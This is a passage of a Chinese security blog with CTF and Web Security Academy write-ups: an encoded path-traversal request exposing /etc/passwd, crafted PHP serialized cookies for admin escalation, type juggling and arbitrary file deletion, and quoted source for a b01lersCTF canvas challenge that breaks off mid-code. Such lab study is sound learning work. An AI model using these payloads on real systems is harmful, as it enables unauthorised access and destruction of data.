class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>证明漏洞存在<br>查看站点日志<br>查看200记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.32.1 - - [06/May/2022:14:17:31 +0000] &quot;GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg HTTP/1.1&quot; 200 10</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>文件文字搜索DASCTF字符串<br>找到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/deserilaze/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/deserilaze/" class="post-title-link" itemprop="url">deserilaze</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-05-05 10:42:15 / 修改时间：17:26:34" itemprop="dateCreated datePublished" datetime="2022-05-05T10:42:15+08:00">2022-05-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="序列化与反序列化专项学习"><a href="#序列化与反序列化专项学习" class="headerlink" title="序列化与反序列化专项学习"></a>序列化与反序列化专项学习</h1><p>序列化与反序列化漏洞广泛存在于各种语言中，</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/5-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/5-7/" class="post-title-link" itemprop="url">5-7</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-05 10:41:44" itemprop="dateCreated datePublished" datetime="2022-05-05T10:41:44+08:00">2022-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-06 13:31:19" itemprop="dateModified" datetime="2022-05-06T13:31:19+08:00">2022-05-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Web-Security-Academy-LAB"><a href="#Web-Security-Academy-LAB" class="headerlink" title="Web Security Academy LAB"></a>Web Security Academy LAB</h1><h2 id="Modifying-serialized-objects"><a href="#Modifying-serialized-objects" class="headerlink" title="Modifying serialized objects"></a>Modifying serialized objects</h2><p>打开靶场，登录题目提供的账号<br>抓包获得信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">GET /academyLabHeader HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ac121f8a1f75ed49c0272335002d0092.web-security-academy.net</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line"></span><br><span class="line">Origin: https://ac121f8a1f75ed49c0272335002d0092.web-security-academy.net</span><br><span class="line"></span><br><span class="line">Sec-WebSocket-Key: 5gIpK1yd1T97xPw/ho6n3g==</span><br><span class="line"></span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line"></span><br><span class="line">Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">Upgrade: websocket</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到session是个成分明显base64<br>解码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到作为入门题，没有特别的<code>token</code>和<code>hash</code>，合理推测布尔型的<code>admin</code>键被用作判断管理员身份<br>手动更改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:1;&#125;</span><br><span class="line">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d</span><br></pre></td></tr></table></figure>
<p>成功得到admin权限</p>
<h2 id="Modifying-serialized-data-types"><a href="#Modifying-serialized-data-types" class="headerlink" title="Modifying serialized data types"></a>Modifying serialized data types</h2><p>抓包获得cookie中的序列化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GET /my-account?id=wiener HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ac6d1f361fafeb64c0b3b6f0008c008c.web-security-academy.net</span><br><span class="line"></span><br><span class="line">Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqaXg3bHd6ZWxvdHg5cWVramxheWV0bmhiM3Z5MjBmOSI7fQ%3d%3d</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: https://ac6d1f361fafeb64c0b3b6f0008c008c.web-security-academy.net/my-account</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqaXg3bHd6ZWxvdHg5cWVramxheWV0bmhiM3Z5MjBmOSI7fQ==</span><br><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;jix7lwzelotx9qekjlayetnhb3vy20f9&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>判断点不在序列化中<br>添加了<code>token</code>，这一字段往往作为证明用户身份的随机字符串。<br>我们需要登录administrator账号<br>题目提示php类型比较，推测可能是后台比较时使用了php弱相等，使用<code>0</code>等绕过若相等。<br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>base64后登录account得到admin权限</p>
<h2 id="Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Using application functionality to exploit insecure deserialization"></a>Using application functionality to exploit insecure deserialization</h2><p>使用初始账号登录account<br>可以上传头像<br>抓个包查看反序列字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /my-account/delete HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ace11fed1f810d69c007edb900f3002f.web-security-academy.net</span><br><span class="line"></span><br><span class="line">Cookie: session=; session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Imw3NTZ0M2xrbmdxd2NkNW1lZ3M0ODhvYWQ2MWY3cXpjIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoidXNlcnMvY2FybG9zL21vcmFsZS50eHQiO30=</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: https://ace11fed1f810d69c007edb900f3002f.web-security-academy.net/my-account?id=gregg</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">Origin: https://ace11fed1f810d69c007edb900f3002f.web-security-academy.net</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyd2dtNnNhb3F1YWo1bGNjMG1zczlzb201cmdjeWw4MCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</span><br><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;rwgm6saoquaj5lcc0mss9som5rgcyl80&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users/wiener/avatar&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到头像<code>avatar</code>的目录地址暴露，同时存在删除功能，考虑能够将删除时的文件路径改为我们需要删除的目标路径，以此达到删除文件的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;gregg&quot;;s:12:&quot;access_token&quot;;s:32:&quot;l756t3lkngqwcd5megs488oad61f7qzc&quot;;s:11:&quot;avatar_link&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用绝对路径指向目标文件，成功删除。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/26/4-27/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/26/4-27/" class="post-title-link" itemprop="url">4-27</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-26 18:48:40" itemprop="dateCreated datePublished" datetime="2022-04-26T18:48:40+08:00">2022-04-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-27 16:11:45" itemprop="dateModified" datetime="2022-04-27T16:11:45+08:00">2022-04-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="b01lersCTF"><a href="#b01lersCTF" class="headerlink" title="b01lersCTF"></a>b01lersCTF</h1><h2 id="hacker-place"><a href="#hacker-place" class="headerlink" title="hacker/place"></a>hacker/place</h2><p>打开网站看到一张画布，并附带了题目源码。<br>这是一个全体客户端共享的画布，每个player每10秒只能画1个像素<br>客户端源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> canvas = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;canvas&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">`ws://<span class="subst">$&#123;location.hostname&#125;</span>:<span class="subst">$&#123;location.port&#125;</span>/`</span>);</span><br><span class="line">ws.onmessage = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> palette = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;color&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">await</span> e.data.arrayBuffer());</span><br><span class="line">    <span class="keyword">switch</span> (data[<span class="number">0</span>]) &#123;  <span class="comment">//data[0] acts like a command opcode</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">//Draw canvas received by server</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; canvas.height; y++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; canvas.width; x++) &#123;</span><br><span class="line">                    ctx.fillStyle = palette[data[y * <span class="number">400</span> + x + <span class="number">1</span>]].id;</span><br><span class="line">                    ctx.fillRect(x, y, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="comment">//Draw 1 pixel</span></span><br><span class="line">            <span class="keyword">let</span> str = <span class="built_in">String</span>.fromCharCode.apply(<span class="literal">null</span>, data);</span><br><span class="line">            <span class="keyword">let</span> x = <span class="built_in">JSON</span>.parse(str.slice(<span class="number">1</span>, <span class="number">4</span>));</span><br><span class="line">            <span class="keyword">let</span> y = <span class="built_in">JSON</span>.parse(str.slice(<span class="number">4</span>, <span class="number">7</span>));</span><br><span class="line">            ctx.fillStyle = <span class="built_in">JSON</span>.parse(str.slice(<span class="number">7</span>));</span><br><span class="line">            ctx.fillRect(x, y, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="comment">//Draw &quot;Cooldown&quot; box</span></span><br><span class="line">            cooldownDiv.style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">            <span class="keyword">let</span> cooldown = <span class="number">10</span>;</span><br><span class="line">            cooldownCounter.innerText = <span class="built_in">String</span>(cooldown);</span><br><span class="line">            <span class="keyword">let</span> interval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                cooldown--;</span><br><span class="line">                cooldownCounter.innerText = <span class="built_in">String</span>(cooldown);</span><br><span class="line">                <span class="keyword">if</span> (cooldown &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    cooldownDiv.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">                    <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">canvas.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> coords = project(e.offsetX, e.offsetY);</span><br><span class="line">    <span class="keyword">let</span> packet = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    packet += leftPad(<span class="built_in">String</span>(coords[<span class="number">0</span>]), <span class="string">&#x27; &#x27;</span>, <span class="number">3</span>);</span><br><span class="line">    packet += leftPad(<span class="built_in">String</span>(coords[<span class="number">1</span>]), <span class="string">&#x27; &#x27;</span>, <span class="number">3</span>);</span><br><span class="line">    packet += <span class="string">&#x27;&quot;&#x27;</span> + paletteElem.id + <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    ws.send(packet);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>服务端源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&#x27;seeeeecret&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;token&#x27;</span> <span class="keyword">in</span> req.cookies) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> token = jwt.verify(req.cookies.token, secret, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>] &#125;);</span><br><span class="line">            req.token = token;</span><br><span class="line">            next();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>); &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> token = &#123; <span class="attr">cooldown</span>: <span class="number">10</span> &#125;;</span><br><span class="line">        req.token = token;</span><br><span class="line">        <span class="keyword">let</span> expires = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        expires.setFullYear(expires.getFullYear() + <span class="number">1</span>);</span><br><span class="line">        res.cookie(<span class="string">&#x27;token&#x27;</span>, jwt.sign(token, secret, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;), &#123;</span><br><span class="line">            expires,</span><br><span class="line">            <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">sameSite</span>: <span class="string">&#x27;strict&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPixel</span>(<span class="params">x, y, color, ws, cooldown</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`setting pixel at <span class="subst">$&#123;x&#125;</span>,<span class="subst">$&#123;y&#125;</span> to <span class="subst">$&#123;color&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> packet = Buffer.alloc(<span class="number">7</span> + color.length);</span><br><span class="line">        packet.writeUInt8(<span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">        packet.write(x, <span class="number">1</span>);</span><br><span class="line">        packet.write(y, <span class="number">4</span>);</span><br><span class="line">        packet.write(color, <span class="number">7</span>);</span><br><span class="line">        placers[<span class="built_in">JSON</span>.parse(x)][<span class="built_in">JSON</span>.parse(y)].send(packet);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123; &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        x = <span class="built_in">JSON</span>.parse(x);</span><br><span class="line">        y = <span class="built_in">JSON</span>.parse(y);</span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">0</span> &amp;&amp; x &lt; <span class="number">400</span> &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; y &lt; <span class="number">400</span> &amp;&amp; palette.indexOf(<span class="built_in">JSON</span>.parse(color)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="string">&#x27;lastPixelPlacedTime&#x27;</span> <span class="keyword">in</span> ws) || <span class="built_in">Date</span>.now() - ws.lastPixelPlacedTime &gt; cooldown * <span class="number">1000</span>) &#123;</span><br><span class="line">                ws.lastPixelPlacedTime = <span class="built_in">Date</span>.now();</span><br><span class="line">                canvas[y * <span class="number">400</span> + x] = palette.indexOf(<span class="built_in">JSON</span>.parse(color));</span><br><span class="line">                <span class="keyword">let</span> packet = Buffer.alloc(<span class="number">7</span> + color.length);</span><br><span class="line">                packet.writeUInt8(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">                packet.write(leftPad(<span class="built_in">String</span>(x), <span class="string">&#x27; &#x27;</span>, <span class="number">3</span>), <span class="number">1</span>);</span><br><span class="line">                packet.write(leftPad(<span class="built_in">String</span>(y), <span class="string">&#x27; &#x27;</span>, <span class="number">3</span>), <span class="number">4</span>);</span><br><span class="line">                packet.write(color, <span class="number">7</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> clients) &#123;</span><br><span class="line">                    c.send(packet);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> clients = [];</span><br><span class="line"><span class="keyword">let</span> placers = <span class="built_in">Array</span>(<span class="number">400</span>).fill(<span class="built_in">Array</span>(<span 